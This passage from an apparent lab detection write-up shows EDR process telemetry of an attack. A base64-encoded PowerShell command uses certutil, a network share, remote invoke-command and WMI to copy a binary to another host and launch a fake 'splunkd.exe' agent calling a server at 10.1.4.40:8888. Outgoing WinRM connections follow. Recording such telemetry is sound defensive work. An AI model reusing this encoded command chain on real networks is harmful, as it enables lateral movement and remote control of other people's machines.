</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p>Child process: <strong>certutil.exe</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\system32\certutil.exe<span style=color:#f1fa8c>&#34; -encode C:\Users\Public\Client1.exe C:\users\public\com.crt&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\system32\certutil.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;fd1670b43e2d9188b12b233780bf043c5a90a67a2c6e3fcdc564a5c246531bc2&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>20480</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGU…&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>61292544</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;PARENT_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;f1172e538d9a0937687748e868de6194&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>6016</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>5276</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;c999c6c3bfd3c25eb4d5502968de6194&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>19</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404436097</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>5276</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>1740</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>}
</span></span></code></pre></div><p>Child process: <strong>Network Connections</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABjAG8AbQAuAGMAcgB0ACAAfAAgAG8AdQB0AC0AbgB1AGwAbAA7AGkAbgB2AG8AawBlAC0AYwBvAG0AbQBhAG4AZAAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAHMAYwByAGkAcAB0AGIAbABvAGMAawAgAHsAIABjAGUAcgB0AHUAdABpAGwAIAAtAGQAZQBjAG8AZABlACAAXABcAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAXABjACQAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGMAbwBtAC4AYwByAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEMAbABpAGUAbgB0ADEALgBlAHgAZQA7ACAAaQBuAHYAbwBrAGUALQB3AG0AaQBtAGUAdABoAG8AZAAgAC0AYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAuACAALQBjAGwAYQBzAHMAIAB3AGkAbgAzADIAXwBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAQwByAGUAYQB0AGUAIAAtAGEAcgBnAHUAbQBlAG4AdABsAGkAcwB0ACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAHMAcABsAHUAbgBrAGQALgBlAHgAZQAgAC0AcwBlAHIAdgBlAHIAIABoAHQAdABwADoALwAvADEAMAAuADEALgA0AC4ANAAwADoAOAA4ADgAOAAgAC0AZwByAG8AdQBwACAAcgBlAGQAIgAgAH0A&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;NETWORK_ACTIVITY&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50079</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404436488</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50080</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404438554</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50081</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404440619</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50082</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404442671</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50083</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404444738</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span><span style=color:#f1fa8c>&#34;DESTINATION&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.20&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>5985</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span><span style=color:#f1fa8c>&#34;IS_OUTGOING&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span><span style=color:#f1fa8c>&#34;PROTOCOL&#34;</span>:<span style=color:#f1fa8c>&#34;tcp4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span><span style=color:#f1fa8c>&#34;SOURCE&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span><span style=color:#f1fa8c>&#34;IP_ADDRESS&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span><span style=color:#f1fa8c>&#34;PORT&#34;</span>:<span style=color:#bd93f9>50084</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759404446788</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>6016</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>5276</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
